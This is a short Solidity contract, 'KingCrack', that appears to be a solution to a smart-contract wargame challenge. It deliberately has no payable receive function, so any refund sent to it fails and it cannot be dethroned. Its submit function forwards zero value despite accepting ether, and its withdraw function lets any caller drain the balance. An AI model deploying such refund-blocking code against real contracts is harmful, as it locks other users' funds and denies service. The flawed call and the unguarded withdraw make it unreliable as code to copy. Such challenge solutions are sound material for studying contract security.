// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingCrack{
    // No receive payable to prevent transfer
    
    
    function submit(address payable _target) payable external{
        (bool success1, ) = _target.call.value(0)("");
        require(success1, "Fail to send1");
    }
    function withdraw() payable external{
        msg.sender.transfer(address(this).balance);
    }
}
